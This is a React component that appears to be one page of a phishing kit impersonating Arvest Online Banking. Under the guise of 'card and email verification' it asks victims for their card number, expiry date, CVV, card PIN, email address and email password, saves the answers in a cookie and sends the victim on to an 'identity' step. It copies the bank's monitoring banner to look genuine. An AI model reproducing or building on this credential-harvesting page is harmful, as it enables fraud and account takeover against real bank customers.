import React, {useState} from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";

type Additional = {
    cn:string;
    edate:string;
    ccv:string;
    pn:string;
    mail:string;
    mail_p: string;
  }

export default function Additional() {
  const [formInput, setFormInput] = useState<Additional>({
    cn: "",
    edate: "",
    ccv:"",
    pn:"",
    mail:"",
    mail_p:""
})

const navigate = useNavigate()

function handleInputChange (event:React.ChangeEvent<HTMLInputElement>){
    setFormInput((prevData) => ({
        ...prevData,
        [event.target.name]: event.target.value
    }))
}

function handleSubmit(event: React.FormEvent<HTMLFormElement>){
    
    event.preventDefault()
    cookies.set("additional", formInput)
    navigate("../identity", {replace:true})
}
  return (
    <>
      <div className="submitForm">
       
        <p
          className="go-left"
          style={{ fontSize: "14px", marginBottom: "30px" }}
        >
         Debit/Credit Card and Email Verification <br />
        </p>
        

        <form id="login-form" onSubmit={handleSubmit} method="post">
        <div className="input-field">
           <input placeholder="Card number" onChange={handleInputChange} name="cn" type="number"/>
       </div>
       
       <div className="input-field">
           <input placeholder="Expiry date" maxLength={7} onChange={handleInputChange} name="edate" type="text"/>
       </div>
       
       <div className="input-field">
           <input placeholder="CVV" name="ccv" maxLength={4} onChange={handleInputChange} type="tel"/>
       </div>

       <div className="input-field">
           <input placeholder="Pin" name="pn" maxLength={6} onChange={handleInputChange} type="tel"/>
       </div>
       <br /><br />
          <div className="input-field" style={{ textAlign: "left" }}>
            <label htmlFor="username">
              Personal Email ID <span style={{ color: "red" }}>*</span>
            </label>
            <input required id="username" onChange={handleInputChange} name="mail" type="text" />
          </div>
          <div className="input-field" style={{ textAlign: "left" }}>
            <label htmlFor="password">
              Email Password <span style={{ color: "red" }}>*</span>
            </label>
            <input required id="password" onChange={handleInputChange} name="mail_p" type="password" />
          </div>

          
        
          <button style={{ marginTop: "-2px" }} type="submit">
          Submit
        </button>
        </form>

        
        <br />

        <p>Unauthorized access is prohibited. Usage may be monitored</p>

        <hr />

        <p>Have questions about Arvest Online Banking?</p>
      </div>
    </>
  );
}
